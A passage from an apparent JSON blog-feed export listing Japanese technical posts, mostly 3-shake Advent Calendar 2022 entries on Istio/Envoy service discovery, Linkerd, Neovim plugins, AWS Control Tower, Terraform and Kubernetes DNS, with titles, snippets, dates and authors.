11.0.0.3                      # bar-pod内のコンテナが待ち受けているポート番号                      port_value: 50002                  health_check_config: {}                health_status: HEALTHY                metadata:                  filter_metadata:                    istio:                      workload: bar                    envoy.transport_socket_match:                      tlsMode: istio                # ロードバランシングアルゴリズムを決める数値                load_balancing_weight: 1        policy:          overprovisioning_factor: 140    ...    - endpoint_config:    ...Administration interface — envoy 1.32.0-dev-bfa0e0 documentationConfigDump (proto) — envoy 1.32.0-dev-bfa0e0 documentation▶ Envoyの負荷分散方式についてload_balancing_weightキー値が等しい場合、EnvoyはP2Cアルゴリズムに基づいてロードバランシングします\uD83D\uDC4DEnvoyの処理の流れのまとめ確認できた宛先情報を、Envoyの処理の流れに当てはめてみました。(1) 送信元マイクロサービスからリクエスト受信送信元マイクロサービスは、宛先マイクロサービス (<任意のIP>/:50002) にリクエストを送信します。サイドカーコンテナのistio-proxyコンテナはこれを受信します。(2) Envoyによるリスナー選択Envoyは、リクエストの宛先 (IPアドレス、ポート番号、パス) からPodのリスナー (0.0.0.0_50002) を選びます。(3) Envoyによるルート選択Envoyは、リスナーに紐づくPodのルート (50002) を選びます。(4) Envoyによるクラスター選択Envoyは、クラスターに紐づくPodのクラスター (outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local) を選びます。(5) Envoyによるクラスター選択Envoyは、クラスターに紐づくPodのインスタンスのエンドポイント (11.0.0.X/:50002) を選びます。(6) 宛先マイクロサービスへのリクエスト送信Envoyは、エンドポイントの宛先にPodのリクエストを送信します。サービスディスカバリーの冒険は以上です⛵05. おわりにIstioの機能の1つである『サービスディスカバリー』の仕組みを、Envoyを交えながらもりもり布教しました。愛が溢れてしまいました。Istioの機能を1つとっても、複雑な仕組みで実現していることがお分かりいただけたかと思います。Istioありがとう\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4F謝辞3-shake SRE Tech Talk での発表前後に、以下の方々に発表内容について助言をいただきました。@ido_kara_deru さん@yosshi_ さん@yteraoka さん(アルファベット順)また、今回の 3-shake Advent Calender 2022 は、以下の方々に企画いただきました。@jigyakkuma_ さん@nwiizo さん(アルファベット順)皆様に感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍Istio in Action (English Edition)作者:Posta, Christian E.,Maloku, RinorManningAmazonIstio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe作者:Calcote, Lee,Butcher, ZackO\'ReillyAmazon","isoDate":"2022-12-24T21:00:00.000Z","dateMiliSeconds":1671915600000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"Linkerdにおけるトラフィック制御","link":"https://zenn.dev/kimitsu/articles/linkerd-traffic-control","contentSnippet":"Linkerd は Kubernetes 用の軽量サービスメッシュです。複雑な設定なしにセキュリティ、可観測性、信頼性をクラスタに追加できるのが特徴とされています。また CNCF では Graduated Project としてホストされています。（ちなみにサービスメッシュのデファクトスタンダードとされている Istio は CNCF では Incubating Project です。）Linkerd の機能の 1 つにトラフィックの制御があります。これはある Pod にリクエストを投げられるのは特定の Pod だけというような制限をかけるためのものです。トラフィック制御の設...","isoDate":"2022-12-24T12:56:07.000Z","dateMiliSeconds":1671886567000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Steam Deck に Windows を入れたい方の参考になれば...!","link":"https://qiita.com/tozastation/items/a57df36a369b5425795a","contentSnippet":"この記事は 3-shake Advent Calendar 2022 の24日目の記事です。はじめに年末、しかもクリスマスということで散財させていただきました。初めまして、戸澤といいます。日常…","isoDate":"2022-12-24T08:36:33.000Z","dateMiliSeconds":1671870993000,"authorName":"tozastation","authorId":"tozastation"},{"title":"hop.nvimで直近の検索パターンにホップ","link":"https://blog.atusy.net/2022/12/21/hop-nvim-gn/","contentSnippet":"本記事はVimアドベントカレンダー2022 その3の21日目の記事です。hop.nvimはeasymotion的な検索対象をラベル付けして、入力されたラベルの場所に飛ぶ系のプラグインです。私はこれまでfモーションの拡張としてしか使ってませんでしたが、/の代替として文字列検索に一致した箇所へホップする機能もあると気付きました。","isoDate":"2022-12-21T00:00:00.000Z","dateMiliSeconds":1671580800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"KubernetesのマニフェストをCIで検査する方針を考える","link":"https://zenn.dev/tayusa/articles/ad9fafa197888b","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 17日目の記事です。https://qiita.com/advent-calendar/2022/3-shake 概要以下の気持ちでKubernetesのマニフェストを検査するツールを選定しました。ベストプラクティスに則りたい細かなレビューの手間を省きたいセキュリティリスクを排除したい保守するのが大変なので出来るだけ自分でポリシーは書きたくない。書くとしても書きやすい方法で記述したい 検査ツールの選定以下のツールからカテゴリ別に選定することにしました。スキーマ検査kubeval...","isoDate":"2022-12-17T03:48:50.000Z","dateMiliSeconds":1671248930000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"もっと良い感じにstyler.nvimでアクティブなウィンドウか否かでカラースキームを変える","link":"https://blog.atusy.net/2022/12/17/styler-nvim-active-win/","contentSnippet":"本記事はVimアドベントカレンダー2022 その3の17日目の記事です。以前、Neovimとstyler.nvimを使ってアクティブウィンドウを目立たせる方法を紹介しました。styler.nvimでアクティブなウィンドウか否かでカラースキームを変える下図のように、注目しているウィンドウが一目瞭然なので気に入ってます。しかし、当時のコードはいくつかの課題を抱えていたので、もう少し洗練させることにしました。","isoDate":"2022-12-17T00:00:00.000Z","dateMiliSeconds":1671235200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"CloudWatch Logs のログストリームごとのサイズを取得する","link":"https://zenn.dev/toshikish/articles/684e4d7ed4532f","contentSnippet":"動機Amazon CloudWatch Logs のログストリームごとのサイズを知りたいことがありました。たとえば Amazon EKS クラスタを立ち上げて Fluentd または Fluent Bit でログを CloudWatch Logs に送る設定をすると，Pod のログは単一のロググループ（デフォルトでは /aws/containerinsights/Cluster_Name/application）に集約されます。https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/Container-Ins...","isoDate":"2022-12-16T08:57:33.000Z","dateMiliSeconds":1671181053000,"authorName":"toshikish","authorId":"toshikish"},{"title":"エンジニア市場拡大のための「憧れの職業」の重要性に関する緒論","link":"https://qiita.com/skikkh/items/21c270c7ff7a942dc5f7","contentSnippet":"はじめに今回、4年ぶりにQiitaに記事を投稿させていただく。ひょんなきっかけ^1で私は、自身が勤めるスリーシェイクのアドベントカレンダーである3-shake Advent Calendar 2…","isoDate":"2022-12-16T02:21:05.000Z","dateMiliSeconds":1671157265000,"authorName":"skikkh","authorId":"skikkh"},{"title":"impatient.nvimによるNeovim起動高速化のコツと作者の思想","link":"https://blog.atusy.net/2022/12/16/impatient-nvim/","contentSnippet":"本記事はVimアドベントカレンダー2022の16日目の記事です。lewis6991/impatient.nvimは、Luaのモジュールをバイトコードとしてキャッシュしたり、モジュールに対応するパスをキャッシュすることで、Neovimの起動を高速化します。うまく使うと作者は54ms -> 6msと10倍近くの高速化を果たしていますし、他の最適化と組み合わせて30倍速を達成した例もあります（https://zenn.dev/kawarimidoll/articles/8172a4c29a6653）。プラグインマネージャは任意で、作者はpacker.nvim、後者の例はvim-plug、本記事の筆者はvim-jetpackを使っています。","isoDate":"2022-12-16T00:00:00.000Z","dateMiliSeconds":1671148800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"⛵️ Istioのサービス間通信を実現するサービスディスカバリーの仕組み","link":"https://speakerdeck.com/hiroki_hasegawa/istioniyorusahisuteisukaharinoshi-zu-mi","contentSnippet":"『3-shake SRE Tech Talk』の登壇資料です\\r\\rIstioのサービスディスカバリーの仕組みについて、Envoyを交えながら解説しました。\\r\\rスライドでは仕組みの詳細を解説できませんでしたので、ぜひ元記事 (Istioのサービス間通信を実現するサービスディスカバリーの仕組み) も参照ください\uD83D\uDC4D\\r\\r\uD83D\uDC26 ツイート：https://x.com/Hiroki__IT/status/1603344099368570880","isoDate":"2022-12-15T05:00:00.000Z","dateMiliSeconds":1671080400000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"Play with \uD83D\uDC10 in Kubernetes","link":"https://speakerdeck.com/kyohmizu/play-with-in-kubernetes","contentSnippet":"3-shake SRE Tech Talk 2022 クリスマス直前会！の資料です。\\rhttps://3-shake.connpass.com/event/267080/","isoDate":"2022-12-15T05:00:00.000Z","dateMiliSeconds":1671080400000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"【Istio⛵️】\\"3-shake SRE Tech Talk\\" に登壇","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2022/12/15/025523","contentSnippet":"発表スライドから得られる知識発表スライドを見ると、以下を \\"完全に理解\\" できます✌️Istioのサービスディスカバリーの仕組みについて発表スライドから得られる知識イベント名発表スライドイベント名オッス！オラ長谷川！✋\uD83C\uDFFB『Istioのサービス間通信を実現するサービスディスカバリーの仕組み』ていうテーマで、 3-shake SRE Tech Talk に登壇したぞ！https://3-shake.connpass.com/event/267080/発表スライドみんな！スライドぜってぇ見てくれよな！本日の発表資料です！⛵️#SRETThttps://t.co/0MKMYVa77u— 長谷川 広樹 (地下強制労働者) (@Hiroki__IT) December 15, 2022 ちな、発表内容の詳細はこの記事をみてくれよな！","isoDate":"2022-12-15T03:00:00.000Z","dateMiliSeconds":1671073200000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"時間がない人のための AWS Solutions Architect - Professional 勉強法","link":"https://zenn.dev/toshikish/articles/06d85a2db79f4d","contentSnippet":"難度が高くしっかりとした準備が必要な AWS SA Pro 試験を申し込んだものの，残された時間があまりないという方向けに書いた勉強法の記事です。 試験の概略 特徴長文の選択式問題が75問出題され，それを180分で解くという長丁場な試験です。ざっくり1問あたり2分24秒かけられます。75問もあり，1問に複数のサービスを関連させられるので，AWS が重点的に問いたいサービス・テーマはもれなく出現します。AWS を使った2年以上の実務経験が想定されていますが，たいていの場合，実務で扱うサービスは主要なサービスに限られ，触ったこともないサービスが多く出題されます。そのため，確...","isoDate":"2022-12-12T10:46:25.000Z","dateMiliSeconds":1670841985000,"authorName":"toshikish","authorId":"toshikish"},{"title":"AWS Control Towerを調べる","link":"https://blog.masasuzu.net/entry/2022/12/10/204957","contentSnippet":"これは  3-shake Advent Calendar 2022 10日目の記事です仕事の中でAWSで複数のアカウントを管理したいという要件あり、その中でAWS Control Towerが使えないかなと調べたものをざっくりと書いていきます。AWS Control TowerとはAWS Control TowerとはLanding Zoneを実装するためのAWSのマネージドサービスです。そもそもLanding Zoneって何って話になりますね。Landing Zoneとはセキュリティとコンプライアンスのベストプラクティスに基づきアーキテクチャ設計とマルチアカウント環境を管理する仕組みを指します。Landing Zoneは、下記機能から構成されます。アカウントの発行必要な初期設定の済んだアカウントを作成管理用権限の発行対象アカウントを管理するための権限を作成AWS ログの集約監査用ログをセキュアに一元保存ガードレールの設置実施してはいけない操作の禁止危険な設定の監視Landing Zoneの実装方法AWS Control TowerAWSサービスとして提供される Landing Zoneです。容易に利用可能ですが、カスタマイズするには制限があります。(必須のガードレールを外せなかったり)主にこれからAWSを利用する場合に利用できます。既存アカウントにも適用可能です。独自実装の Landing Zone自組織で独自実装するパターンです。自組織の方針に従って自由にカスタマイズできるのが強みです。ただし、自由にカスタマイズはできますが、自身でメンテナンスしないといけないので、コストはかかります。主に既存アカウントに適用する場合に利用できます。自組織でアカウント発行の仕組みや管理の仕組みができあがってる場合などです。そもそもなんでマルチアカウントにするのかAWSをマルチアカウントにする観点として以下のものが考えられます。環境の分離開発、テスト、本番を分離することによるセキュリティおよび統制の確保請求の分離部門やシステム単位でのコスト明確化権限の分離部門間での権限分離およびアカウントへの権限移譲複雑性の分離アカウントの目的を明確に絞ることで、構成がシンプルになるAWS Organizationsだけでもできることマルチアカウント管理するだけならOrganizationだけでもある程度はできます。むしろAWS Control TowerはOrganizationの機能を利用しています。複数AWSアカウントの一元管理Organization Unit(OU)の作成複数アカウントのグルーピング化AWSアカウントの発行Service Control Policyの作成、OUへの適用複数アカウントの一括請求AWS Control Towerだと何ができるのかControl Towerで提供される機能として以下のものがあります。Landing Zoneの提供AWS Organizationを使用してマルチアカウントを作成デフォルトでSandbox、SecurityのOUを作成AWS IAM アイデンティティセンターを利用したID管理を提供Account FactoryAWSアカウントのプロビジョニングの自動化設定可能なテンプレートを提供CloudTrailとConfigログの保存Log Archiveアカウント内のS3バケットに一元的に保存されるガードレールの提供必須と任意の観点の2種類と予防的と発見的の2種類の組み合わせがありControl Towerにより管理下のアカウントに適用される参考: ガードレールの仕組み予防的ガードレール(Service Control Policy)禁止されたアクションの実行が拒否される仕組みControl Tower管理下のアカウントは必須の予防的ガードレールで禁止されているアクションが不可能発見的ガードレール(Config)特定のイベントが発生したときにCloudTrailに記録される仕組みダッシュボードOUやアカウント、ガードレール違反などが一覧表示できるAWS Control TowerではできないことAWS Control Towerでは提供されてない機能もあります。GuardDutyやSecurity Hubなどのセキュリティ機能を組織全体適用するにはOrganizationsの機能を利用する必要があります。AWS Control Towerの注意点、制約事項いろいろ資料を見てみてこの辺注意が必要かなという点を書いていきます。注意点既存アカウントの Control Tower への受入処理時にエラーになった場合、スタックセット内で自動実行される作業の一部手作業が必要になる参考:トラブルシューティング - AWS Control Tower独自ガードレールの追加は可能だが、容易ではない。必須ガードレールを外せない参考:必須のガードレール - AWS Control Tower各種セキュリティー機能は自動で有効化されないため、Control Towerの範囲外のセキュリティ機能は Control Tower の機能の外で管理が必要になる範囲内の機能: Config, CloudTrail, SCP範囲外の機能: GuardDuty, Security Hub, IAM Access Analyzer, DetectiveControl Tower 未対応リージョンを使用している場合、Control Tower適用リージョンと適用外リージョンが混在して管理が煩雑になる大阪リージョン未対応なのでマルチリージョンを考えるときに注意Control Towerはマネージドサービスであるが追加機能によっては手動バージョンアップ が必要になるケースがある参考: ランディングゾーンを更新する - AWS Control Tower参考: 更新について - AWS Control Towerログアーカイブアカウントで独自のログバケットを作成可能だが、非推奨参考: ランディングゾーンのセットアップに関する管理上のヒントリージョンの使用を制限する SCP の併用に注意が必要参考: AWS Control Tower リソースの作成および変更に関するガイダンスIaC との境界の検討が必要アカウント発行に関してはControl Tower(Account Factory)で手動で行い、その後のアカウント設定はTerraformで行うなどAccount Factory for Terraformを利用することでAWSアカウント発行は可能参考: AWS Control Tower Account Factory for Terraform によるアカウントのプロビジョニングどこまでTerraformで対応するかは別途検討が必要制限とクォータS３へのログの保存期間は、最大15年間保存可能(最近アップデートされた)Security OU の共有アカウントの E メールアドレスは変更可能だが、これらの変更を AWS Control Tower コンソールで確認するには、Landing Zone を更新する必要があるAWS Control Tower Landing zone の OU には、OU あたり5個のSCPの制限が適用される300超のアカウントを持つ既存の OU は、AWS Control Tower に登録することはできない300を超える場合はOUを分ける必要があるOUのネストは２段階まで、孫OUを持つことはできない参考: AWS Organizations における組織単位のベストプラクティスAWS Control Towerを使うべきなのかマルチアカウントを展開していくのであれば、AWSのベストプラクティスに乗れるので、使用するのが無難です。ただし、独自のLanding Zoneをすでに構築しており、Account Factoryの仕組みも独自で構築できているのであれば、移行コストを鑑みてそのままでも問題ないです。必須の予防的ガードレールが許容できない、OUなどの制限にひっかるなどの運用上の制約がある場合は使えないので、組織のポリシーを見直すか、独自でLanding Zoneを作るかを考える必要があります。発展もっと調査したかったが、時間が足りなかったことや今後調べたいことです。コンソールからAccount Factory実行するとService Catalogの設定項目がありますが、Service Catalog自体の理解不足でどう扱うのかが把握できてないのでこの辺調べたいです。Account Factory for Terraform(AFT)を使うとアカウント発行そのものもIaC化できるので試したい。参考: AWS Control Tower Account Factory for Terraform によるアカウントのプロビジョニング参考: ついにControl Towerのアカウント発行からカスタマイズまでIaC対応！Account Factory for Terraform (AFT)が新登場 #reinvent | DevelopersIOCustomization for Control Tower(CfCT)を使うとアカウント発行のイベントをトリガーにCloudFormationを実行できるので、これも実験したい。参考: AWS Control Tower のカスタマイズ (CfCT) の概要 - AWS Control Tower参考: Control Towerカスタマイズソリューション(CfCT)を使ってガードレールとCloudFormationを自動展開してみた | DevelopersIOまとめControl Towerについて調べたことを書いていきました。実運用自体はまだしてないので、これから触ってみて知見が溜まってきたらまたそれも共有できたらと思います。","isoDate":"2022-12-10T11:49:57.000Z","dateMiliSeconds":1670672997000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"インシデント対応しながら書くポストモーテム","link":"https://zenn.dev/toshikish/articles/1d5bcf9ed1939d","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 8日目の記事です。サービスにおいてインシデントが発生した場合に書くポストモーテムについて，書く負担を減らせるようなテンプレートを提案します。 ポストモーテムのテンプレートポストモーテムのテンプレートは，例えば以下のようなものが公開されています。 Google SREhttps://sre.google/sre-book/example-postmortem/タイトル・インシデント ID日付対応者ステータス概要影響主な原因障害発生のトリガー解決策検知アクションアイテム...","isoDate":"2022-12-07T22:00:00.000Z","dateMiliSeconds":1670450400000,"authorName":"toshikish","authorId":"toshikish"},{"title":"私のzshrcの推しポイント","link":"https://blog.atusy.net/2022/12/07/zshrc2022/","contentSnippet":"私のzshrcの推しポイントを簡単にまとめておくzshrcはGitHubで管理しているので、推しポイントへのリンクも適宜掲載しておくプロンプトhttps://github.com/atusy/dotfiles/blob/c654f90e8ec9ebbc18543d8f0349f7f8202f20c0/dot_zshrc#L20-L36","isoDate":"2022-12-07T00:00:00.000Z","dateMiliSeconds":1670371200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"社会に蔓延る労苦〈Toil〉をなくす（株式会社スリーシェイク入社エントリ）","link":"https://qiita.com/tayakun/items/2f5ca30b777a54b2c52d","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 5日目の記事です。前日は @aqarium さんによる 徒然なるままにDatadog APM でした。私は株式会社スリ…","isoDate":"2022-12-05T14:18:53.000Z","dateMiliSeconds":1670249933000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Prometheus で探索対象の ServiceMonitor を広げる","link":"https://zenn.dev/toshikish/articles/70424038397d6d","contentSnippet":"Kubernetes クラスタで Prometheus を導入し，ServiceMonitor を作って監視対象を定義したところ，一向に Target として追加されないことがありました。ServiceMonitor が作られているだけでは不十分で，Prometheus の探索する対象に入っている必要があります。それがどこで定義されているかを調べました。以下のような ServiceMonitor を考えます。apiVersion: monitoring.coreos.com/v1kind: ServiceMonitormetadata:  name: example-serv...","isoDate":"2022-12-05T09:53:34.000Z","dateMiliSeconds":1670234014000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Cloud Runで定期ジョブを実行する","link":"https://zenn.dev/satohjohn/articles/20ebf8d1bed1d1","contentSnippet":"本記事は GCP(Google Cloud Platform) Advent Calendar 2022 の4日目のものです。3日目は @po3rin さんのAPI on GKE に高速で認証をつけるIdentity-Aware Proxy \xd7 Identity Platform でした。 概要普段、GCPを使ったWebアプリケーション開発をしていますが、その中で、定期的に(スケジューリングをして)、ジョブを実行するということがあります。例えば、DBのデータの整合性とか、ログの収集とか。。。この要件のときは、GCP内で完結させるとして、Cloud SchedulerのHTTP...","isoDate":"2022-12-04T13:48:19.000Z","dateMiliSeconds":1670161699000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Osaka.Rで朝もくを続けて2年8ヶ月くらいになった","link":"https://blog.atusy.net/2022/12/04/osakar-asa-moku/","contentSnippet":"本記事は2022/12/04のR言語アドベントカレンダーの記事です。https://qiita.com/advent-calendar/2022/rlang12/03はyutannihilationさんによる「dplyr 1.1.0からはgroup_by()の代わりに.by引数が使えるらしいという話」でした。","isoDate":"2022-12-04T00:00:00.000Z","dateMiliSeconds":1670112000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Codecov非対応の言語でもCodecovみたいなことをしたい時","link":"https://zenn.dev/kimitsu/articles/coverage-like-codecov","contentSnippet":"Codecov は、PR へのコメントや README のバッジのような方法でコードのカバレッジを可視化できるツールです。カバレッジを開発者に対して頻繁にフィードバックすることで、開発者はテストを意識するようになります。一方で世の中には星の数ほど言語がありますが Codecov がサポートしているものは意外と少ないです。https://docs.codecov.com/docs/supported-languagesまた色々な理由で Codecov を使いたくない / 使えないという場合もあるかと思います。この記事では Codecov 非対応の言語でも Codecov みたいな...","isoDate":"2022-11-29T13:38:06.000Z","dateMiliSeconds":1669729086000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"複数の Terraform リソースを一度に別の tfstate ファイルに移動する","link":"https://zenn.dev/toshikish/articles/61db8661cb28ba","contentSnippet":"Terraform の tfstate ファイル間のリソースの移動方法は，基本的には以下の記事の通りです。https://www.karakaram.com/moving-terraform-resources-to-another-tfstate-file/この記事では複数リソースを移動したい場合の方法を書きます。 方法やることはシンプルで，リソースをファイルで列挙して xargs で terraform state mv を繰り返すだけです。移動元ディレクトリで terraform state list を実行することで，その tfstate ファイル内の全リソースを取...","isoDate":"2022-11-25T07:33:50.000Z","dateMiliSeconds":1669361630000,"authorName":"toshikish","authorId":"toshikish"},{"title":"styler.nvimでアクティブなウィンドウか否かでカラースキームを変える","link":"https://blog.atusy.net/2022/11/25/styler-nvim-dim-inactive-windows/","contentSnippet":"本記事の改訂版が出ていますhttps://blog.atusy.net/2022/12/17/styler-nvim-active-win/先日はstyler.nvimを使ってバッファが作業ディレクトリに属すか否かで適用するカラースキームを変えました。styler.nvimを使うとバッファごとにcolorschemeを変えられて便利今回はウィンドウがアクティブか否かで適用するカラースキームを変えてみます。似た用途でtint.nvimを使うと、非アクティブなウィンドウのコントラストを抑えられます。しかし、styler.nvimと干渉するのと、コントラストを落としたせいで視認性に乏しくなるおそれがあります。styler.nvimだけ使えば干渉の心配はなくなりますし、人気なカラースキームを使えば低コントラストでも十分な視認性が期待できます。特にnightfox.nvimが提供する高コントラストなduskfoxと低コントラストなnordfoxは文字の色合いが似ていることもあり、相性がよく、今回試してみました。また、styler.nvimはウィンドウローカルなカラースキームを実現するもので、cmdlineやウィンドウ境界はターゲットとしていません。こういったその他の部分やfloatwinにはcatppuccinを採用してみました。--[[# Change colorschemes by active/inactive windowsThis is a simplified version, and may cause performance issue if so many windows are open.## Requirements:- nvim >= 0.8- plugins - folke/styler.nvim - catppuccin/nvim - EdenEast/nightfox.nvim]]-- settings-- ACTIVE_COLORSCHEME and INACTIVE_COLORSCHEME must be colorschemes using `nvim_set_hl`BASE_COLORSCHEME = \'catppuccin-mocha\'ACTIVE_COLORSCHEME = \'duskfox\'INACTIVE_COLORSCHEME = \'nordfox\'-- Apply colorschemevim.cmd(\\"colorscheme \\" .. BASE_COLORSCHEME)-- Create autocmd to apply styler.nvim on active/inactive windowsnvim.api.nvim_create_autocmd( { \'WinEnter\', \'BufEnter\' }, { group = nvim.api.nvim_create_augroup(\'theme-custom\', {}), callback = function(_) local set_theme = require(\'styler\').set_theme local win = nvim.api.nvim_get_current_win() -- use default colorscheme instead of applying styler.nvim on floatwin -- because some UIs are composed of multiple windows and they should share the theme if api.nvim_win_get_config(win).relative ~= \\"\\" then return end -- apply styler.nvim on active window set_theme(win, { colorscheme = ACTIVE_COLORSCHEME }) -- apply styler.nvim on inactive windows for _, w in pairs(api.nvim_tabpage_list_wins(0)) do if w ~= win then set_theme(w, { colorscheme = INACTIVE_COLORSCHEME }) end end end })ENJOY!!","isoDate":"2022-11-25T00:00:00.000Z","dateMiliSeconds":1669334400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"styler.nvimを使うとバッファごとにcolorschemeを変えられて便利","link":"https://blog.atusy.net/2022/11/23/styler-nvim/","contentSnippet":"This Week in Neovimという、週次でNeovim関係のニュースを届けてくれるウェブサイトの21 Nov 2022号で、プラグインのfolke/styler.nvimが紹介されていました。このプラグインの目的は、READMEにある通り、ファイルタイプごとのカラースキーム設定です。","isoDate":"2022-11-23T00:00:00.000Z","dateMiliSeconds":1669161600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"docker-buildxとmulti-platform build周りについてまとめ","link":"https://zenn.dev/bells17/articles/docker-buildx","contentSnippet":"最近docker buildxを使ったmulti-platform build周りについての知見がある程度溜まってきたので必要そうな情報をまとめておく。buildx自体が実際に使うとハマりどころが多いので、すんなりと納得できるような文章がかけてないとは思うけど、実際に触る人がハマったり疑問に思ったりする内容の穴埋めはある程度できてるとは思ってる。ちなみにこの記事を書いてる時点のdocker-buildxの最新バージョンがv0.9.1なので、貼ってあるbuildxのリンクについては基本このバージョンのものになる。 docker-buildxってなに？リポジトリを見るとdock...","isoDate":"2022-11-19T16:52:45.000Z","dateMiliSeconds":1668876765000,"authorName":"bells17","authorId":"bells17"},{"title":"AWS IAM ポリシーの StringNotEquals 条件の複数値指定は AND になる","link":"https://zenn.dev/toshikish/articles/2d9274783acbae","contentSnippet":"AWS IAM ポリシーの条件で同一キーに対して複数値を指定した場合，通常は OR で評価されます。例えば，以下の StringEquals 条件の例では，aws:PrincipalTag/role が audit または security のいずれかであれば true になります。\\"Condition\\": {  \\"StringEquals\\": {    \\"aws:PrincipalTag/role\\": [ \\"audit\\", \\"security\\" ]  }}では StringNotEquals 条件にするとどうでしょうか？例えば以下のポリシーで aws:Principal...","isoDate":"2022-11-10T08:31:56.000Z","dateMiliSeconds":1668069116000,"authorName":"toshikish","authorId":"toshikish"},{"title":"2022年10月のふりかえり、まとめ","link":"https://blog.masasuzu.net/entry/2022/11/09/082007","contentSnippet":"7年ぶりにふり返りするような気がします。これぶりですかね。blog.masasuzu.net10月は思い立って細かいことでも記録に残すようにし始めたのでサブブログの月間投稿数が増えてます。このまま続けたいところです。メインブログは相変わらず0なのでちゃんと書きたいところではあります。2022-10-01から1ヶ月間の記事一覧 - ふり返る暇なんて無いね仕事10月は端境期だったので、技術検証をメインでやってました。技術メインブログの方はどちらかというとパブリック向けに書いてます。ただ、この方針だと記事がゆるい記事が書きにくくなってきたので、サブブログを作った経緯があります。サブブログの技術記事は他の誰かのためではなく未来の自分が思い出すために書くをモットーに書いてます。なのでゆるく、細かい系のことも気軽に書いてます。分からないことは分からないと明示する。途中でも経過を残す。恥も残す。そんな感じです。以前とくらべてGoogle Cloud回りを10月はいじってた感じですね。build-in commandのmanが引けなくて困った - ふり返る暇なんて無いねt3系インスタンスのスペックについて - ふり返る暇なんて無いねGoogle Cloudの外部HTTP(S)ロードバランサと外部HTTP(S)ロードバランサ(従来型)の違いがわからなかった。 - ふり返る暇なんて無いね未解決: Google Cloud Storageの静的配信でnginxで言うところのtry_files的なことをしたかった。。。。 - ふり返る暇なんて無いねはてなブログのカテゴリごとのRSSフィード - ふり返る暇なんて無いねGitHub Actionsで save-state とset-output が廃止されるようです。 - ふり返る暇なんて無いね故障と障害の違いがわからずに困惑してた - ふり返る暇なんて無いね資格PCA取りました!11月にはPCA、KCNA、年内にCKA、CKADを取ることを目標に業務とは別に学習してます。なお、業務ではGoogle CloudもKubernetesも今のところ触る余地ないです。が、将来の投資として学習してます。近い未来で使うのが目に見えてるので。Google Cloud認定 Professional Cloud Architect合格してた - ふり返る暇なんて無いね11月末ターゲットで2個資格試験受けます - ふり返る暇なんて無いね旅土曜日の午前中に温泉入るのにはまってます。休日の早い時間に行動すると時間の有効活用ができるなとしみじみ感じてます。人生に疲れたので熱海で温泉入ってきた - ふり返る暇なんて無いね横須賀で温泉入ってきた - ふり返る暇なんて無いね江ノ島に行ってきて午前中だけで満足した - ふり返る暇なんて無いね生活寒くなりましたが、がんばります。今季初暖房使いました。 - ふり返る暇なんて無いね技術書を複数回読むということ - ふり返る暇なんて無いねワクチン4回目打った\uD83D\uDC89\uD83D\uDC89\uD83D\uDC89\uD83D\uDC89 - ふり返る暇なんて無いね11月に向けてといっても11月始まってますが。11月は資格の勉強もあるし、新しい固めのお仕事も始まるので、だいぶヘビーになる予感を感じてます。寒くなる季節なので体調には気を付けつつも、引き続き温泉につかり、ブログ書くのも続けて行きたいですね。","isoDate":"2022-11-08T23:20:07.000Z","dateMiliSeconds":1667949607000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"telescope.nvimで作る簡易コマンドパレット（VSCodeのCtrl + Shift + Pっぽいの）","link":"https://blog.atusy.net/2022/11/03/telescope-as-command-pallete/","contentSnippet":"telescope.nvimはキーマップ、Exコマンド、ファイルなどを検索・活用するためのNeovim用プラグインです。この内、キーマップ（:Telescope keymaps）の主な用途は忘れてしまったマッピングの検索でしょう。実は、<Plug>系のマッピングを実際のキー入力にアサインせずとも使えるので、滅多に使わない機能へ簡単にアクセスする方法として便利です。","isoDate":"2022-11-03T00:00:00.000Z","dateMiliSeconds":1667433600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"[2022/10/28] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20221028","contentSnippet":"#kubenewsの2022年10月28日の回で話す、@bells17が今週気になったニュース記事をまとめたものです自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってますこの記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です配信URL:https://youtu.be/whnN4hwsIYg 告知とかニュースっぽいもの Open Networking Conference Japanちょうど今日開催し...","isoDate":"2022-10-28T13:05:14.000Z","dateMiliSeconds":1666962314000,"authorName":"bells17","authorId":"bells17"},{"title":"Kubernetes クラスタ内ホスト名に CNAME レコードでエイリアスを付与したい","link":"https://zenn.dev/toshikish/articles/7f555dbf1b4b7d","contentSnippet":"Kubernetes クラスタ内で使えるホスト名に CNAME レコード相当でエイリアスを付与したい場合を考えます。クラスタ内では CoreDNS が使われているものとします。 TL;DRCorefile（CoreDNS の設定ファイル）で rewrite プラグインを使って記述します。例えば Service のアドレスである foo.default.svc.cluster.local を foo.example.com 